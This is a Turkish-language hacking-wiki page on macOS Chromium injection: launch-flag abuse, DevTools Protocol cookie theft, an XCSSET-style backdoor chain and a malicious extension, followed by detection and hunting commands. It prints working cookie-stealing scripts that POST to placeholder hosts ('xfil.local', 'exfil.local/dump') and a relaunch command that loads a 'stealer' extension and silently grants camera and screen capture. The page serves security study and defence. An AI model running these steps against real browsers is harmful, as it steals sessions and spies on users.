# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi ve Opera gibi Chromium tabanlı tarayıcıların tümü aynı command-line switch'lerini, preference dosyalarını ve DevTools automation interface'lerini kullanır. macOS'ta GUI erişimine sahip herhangi bir user, mevcut bir browser session'ını sonlandırabilir ve hedefin entitlement'larıyla çalışan arbitrary flag'ler, extension'lar veya DevTools endpoint'leriyle yeniden açabilir.

#### macOS'ta custom flag'lerle Chromium başlatma

macOS, her Chromium profile'ı için tek bir UI instance'ı tutar; bu nedenle instrumentation işlemi normalde browser'ı force-close etmeyi gerektirir (örneğin `osascript -e 'tell application "Google Chrome" to quit'` ile). Attackers genellikle app bundle'ı değiştirmeden argument inject edebilmek için `open -na "Google Chrome" --args <flags>` ile yeniden başlatır. Bu command'i bir user LaunchAgent (`~/Library/LaunchAgents/*.plist`) veya login hook içine sarmalamak, tamper edilmiş browser'ın reboot/logoff sonrasında yeniden başlatılmasını garanti eder.

#### `--load-extension` Flag'i

`--load-extension` flag'i unpacked extension'ları (virgülle ayrılmış path'ler) otomatik olarak yükler. Legitimate extension'ları engellerken yalnızca payload'un çalışmasını zorlamak için bunu `--disable-extensions-except` ile birlikte kullanın. Malicious extension'lar `debugger`, `webRequest` ve `cookies` gibi yüksek etkili permission'lar isteyerek DevTools protocol'lerine pivot edebilir, CSP header'larını patch edebilir, HTTPS'i downgrade edebilir veya browser başlar başlamaz session material'ını exfiltrate edebilir.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flag'leri

Bu switch'ler, external tooling'in browser'ı kontrol edebilmesi için Chrome DevTools Protocol'ünü (CDP) TCP veya pipe üzerinden açığa çıkarır. Google, bu interface'in yaygın infostealer abuse örneklerini gözlemledi ve Chrome 136'dan (March 2025) itibaren browser, non-standard bir `--user-data-dir` ile başlatılmadığı sürece default profile için bu switch'leri ignore eder. Bu, gerçek profile'larda App-Bound Encryption'ı zorunlu kılar; ancak attackers yine de fresh bir profile spawn edebilir, victim'ı bu profile içinde authenticate olmaya (phishing/triage assistance) zorlayabilir ve CDP üzerinden cookies, tokens, device trust states veya WebAuthn registrations harvest edebilir.<sup>[5]</sup>

#### `--user-data-dir` Flag'i

Bu flag, browser profile'ının tamamını (History, Cookies, Login Data, Preference dosyaları vb.) attacker-controlled bir path'e yönlendirir. Modern Chrome build'lerini `--remote-debugging-port` ile birleştirirken zorunludur ve ayrıca tamper edilmiş profile'ı izole tutarak security prompt'larını devre dışı bırakan, extension'ları otomatik yükleyen ve default scheme'leri değiştiren önceden doldurulmuş `Preferences` veya `Secure Preferences` dosyalarını bırakabilmenizi sağlar.

#### `--use-fake-ui-for-media-stream` Flag'i

Bu switch, camera/mic permission prompt'unu bypass eder; böylece `getUserMedia` çağıran herhangi bir page anında access alır. Bunu `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` gibi flag'lerle veya CDP `Browser.grantPermissions` command'leriyle birleştirerek audio/video'yu sessizce capture edebilir, desktop share yapabilir veya user interaction olmadan WebRTC permission check'lerini karşılayabilirsiniz.

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse genellikle initial payload yerine bir **post-exploitation** aşamasıdır. Yakın zamanda macOS developer'larını hedefleyen bir campaign, code'un victim'ın project'i yalnızca **build** etmesi sırasında çalışması, sadece clone etmesi veya açması sırasında çalışmaması için zehirlenmiş bir Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`) kullandı. Bu ilk execution sonrasında malware diğer `.xcodeproj` tree'lerini de infect etti, malicious Git `pre-commit` hook'ları ekledi ve daha fazla Xcode project'i için ZIP archive'larını aradı.<sup>[3]</sup>

Chromium abuse açısından bunun önemi, attacker'ın browser binary'sini patch'lemesinin gerekmemesidir. Kısa ömürlü bir build-phase / `osascript` stager bunun yerine, user her başlattığında legitimate browser'ı attacker-controlled flag'lerle yeniden açan bir **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher vb.) install edebilir.<sup>[3]</sup>

> [!TIP]
> Developer endpoint'lerinde beklenmeyen `curl`, `osascript`, `xxd`, nested `base64` veya Chrome relaunch logic'i için `.pbxproj` dosyalarını, `.git/hooks/pre-commit` dosyasını ve `.xcodeproj` içeren ZIP'leri inceleyin.

## Remote Debugging & DevTools Protocol Abuse

Chrome dedicated bir `--user-data-dir` ve `--remote-debugging-port` ile yeniden başlatıldığında, CDP üzerinden (örneğin `chrome-remote-interface`, `puppeteer` veya `playwright` aracılığıyla) attach olabilir ve high-privilege workflow'ları script'leyebilirsiniz:

- **Cookie/session theft:** `Network.getAllCookies` ve `Storage.getCookies`, App-Bound encryption normalde filesystem access'ini engelleyecek olsa bile HttpOnly değerlerini döndürür; çünkü CDP browser'dan bunları decrypt etmesini ister.
- **Permission tampering:** `Browser.grantPermissions` ve `Emulation.setGeolocationOverride`, camera/mic prompt'larını bypass etmenize (özellikle `--use-fake-ui-for-media-stream` ile birlikte kullanıldığında) veya location-based security check'lerini falsify etmenize olanak tanır.
- **Keystroke/script injection:** `Runtime.evaluate`, active tab içinde arbitrary JavaScript çalıştırarak credential lifting, DOM patching veya navigation sonrasında hayatta kalan persistence beacon'larının inject edilmesini sağlar.<sup>[1]</sup>
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` ve `Fetch.enable`, disk artifact'larına dokunmadan authenticated request/response'ları real time olarak intercept eder.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, victim's existing `~/Library/Application Support/Google/Chrome` directory's staging path'e kopyalanması artık decrypted cookies elde edilmesini sağlamaz. Bunun yerine, kullanıcıyı instrumented profile içinde kimlik doğrulamaya yönlendirin (ör. "yardımcı" bir support session) veya CDP-controlled network hooks aracılığıyla MFA tokens'ı transit halindeyken yakalayın.<sup>[5]</sup>

### XCSSET-style CDP Backdoor Chain

Pratik bir malware pattern'i şöyledir:

1. Chrome her başlatıldığında userland implant veya wrapper'ı yeniden başlatın.
2. Meşru browser'ı `--remote-debugging-port=<port>` ve Chrome 136+ sürümlerinde genellikle eşleştirilmiş, default olmayan bir `--user-data-dir=<dir>` ile başlatın.
3. Local CDP WebSocket'e bağlanan ve `Page.addScriptToEvaluateOnNewDocument` ile bir pre-document hook kaydeden bir helper başlatın.<sup>[2]</sup>

Bu helper, site kodu çalışmadan **önce** JavaScript enjekte edebilir. Bu da disk üzerindeki dosyalara patch uygulamadan `window.fetch`, `XMLHttpRequest`, wallet providers veya autofill flows üzerinde hook oluşturmak için idealdir.<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Daha güçlü bir varyant, browser'ı bir **host command bridge**'e dönüştürür: enjekte edilen JavaScript, delimiter-tagged bir `console.log` üretir; yerel helper `Runtime.consoleAPICalled` olaylarını izler, marker'ı kaldırır, kalan kısmı host shell üzerinden (örneğin Go'nun `exec.Command` işleviyle) çalıştırır ve stdout/stderr çıktısını saldırganın WebSocket'i üzerinden geri gönderir. Bu, tab düzeyindeki script execution yeteneğini büyük ölçüde fileless bir reverse shell'e yükseltir.<sup>[3]</sup>

## Debugger API Üzerinden Extension-Based Injection

2023 tarihli "Chrowned by an Extension" araştırması, kötü amaçlı bir extension'ın `chrome.debugger` API'sini kullanarak herhangi bir tab'a bağlanabileceğini ve `--remote-debugging-port` ile elde edilenlerle aynı DevTools yetkilerini kazanabileceğini gösterdi.<sup>[6]</sup> Bu, orijinal isolation varsayımlarını (extension'ların kendi context'lerinde kalması) bozar ve şunları mümkün kılar:

- `Network.getAllCookies`/`Fetch.getResponseBody` ile cookie ve credential'ların sessizce çalınması.
- Site permission'larının (camera, microphone, geolocation) değiştirilmesi ve security interstitial'larının bypass edilmesi; böylece phishing sayfalarının Chrome dialog'larını taklit etmesine olanak tanınması.
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` veya `Security.handleCertificateError` kullanılarak TLS warning'lerinin, download'ların veya WebAuthn prompt'larının programatik olarak yönlendirilmesi.

Kullanıcı etkileşimi gerekmemesi için extension'ı `--load-extension`/`--disable-extensions-except` ile yükleyin. API'yi weaponize eden minimal bir background script şu şekilde görünür:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Eklenti ayrıca JavaScript değişkenlerini okumak, inline script'leri yamalamak veya gezinmeler sonrasında da geçerli kalan özel breakpoint'ler bırakmak için `Debugger.paused` olaylarına abone olabilir. Her şey kullanıcının GUI oturumu içinde çalıştığından Gatekeeper ve TCC tetiklenmez; bu da bu tekniği kullanıcı bağlamında çalıştırma elde etmiş malware için ideal kılar.<sup>[6]</sup>

## Detection & Hunting

- `--remote-debugging-port`, `--remote-debugging-pipe` veya şüpheli bir `--user-data-dir` ile başlatılan Chromium tarayıcıları için, özellikle üst süreç `bash`, `sh`, `osascript`, `xcodebuild` veya bir LaunchAgent helper olduğunda uyarı oluşturun.
- Bir helper'ın yerel bir CDP WebSocket'i açtığı, `Page.addScriptToEvaluateOnNewDocument` kaydettiği ve ardından uzun süreli bir dışa doğru WebSocket/HTTPS bağlantısı kurduğu kısa zincirleri arayın.
- Tarayıcının `Runtime.consoleAPICalled` etkinliğini, saldırgan tarafından sağlanan komutları çalıştıran alt shell'ler veya helper process'lerle ilişkilendirerek console-to-shell bridge'lerini arayın.
- Developer Mac'lerde, browser wrapper kurulumu için `.pbxproj` içindeki `PBXShellScriptBuildPhase` girdilerini, Git `pre-commit` hook'larını, Dock/login item relauncher'larını ve ZIP içinde bulunan Xcode project'lerini inceleyin.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Araçlar

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Chromium başlatmalarını payload extensions ile otomatikleştirir ve etkileşimli CDP hooks sunar.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operatörleri için traffic interception ve browser instrumentation üzerine odaklanan benzer bir tool.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Bir `--remote-debugging-port` instance aktif olduğunda Chrome DevTools Protocol dumps (cookies, DOM, permissions) üzerinde script çalıştırmak için Node.js library.

### Örnek
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Araç bağlantılarında daha fazla örnek bulabilirsiniz.

## Kaynaklar

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Xcode Assassin Geri Dönüyor: En Yeni XCSSET Sürümüne Derinlemesine Bakış - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [X'te Ron Masas (@RonMasas)](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Güvenliği iyileştirmek için remote debugging switch'lerinde yapılan değişiklikler - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Bir Extension Tarafından Chrowned: Debugger API aracılığıyla Chrome DevTools Protocol'ün kötüye kullanılması (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
